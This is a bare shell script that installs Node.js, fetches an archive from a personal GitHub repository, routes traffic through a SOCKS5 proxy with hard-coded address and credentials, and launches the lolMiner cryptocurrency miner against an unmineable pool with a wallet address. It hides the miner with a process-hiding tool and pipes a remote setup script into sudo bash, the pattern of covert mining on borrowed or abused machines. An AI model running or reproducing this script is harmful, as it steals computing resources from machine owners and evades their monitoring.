apt update && apt -y install sudo wget curl unzip

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/denisule54/why/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 209.127.191.180:9279

socks5_username = yujeskyf

socks5_password = q4x64nhe8eod

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz
tar -xf lolMiner_v1.46a_Lin64.tar.gz && cd v1.46a

ph add lolMiner

./graftcp/graftcp ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user RVN:RBXC64GiFJYcYMnfHV5XjTELsHEEQxivmZ.$(echo $(shuf -i 1-9999 -n 1)-lol) --ethstratum ETHPROXY
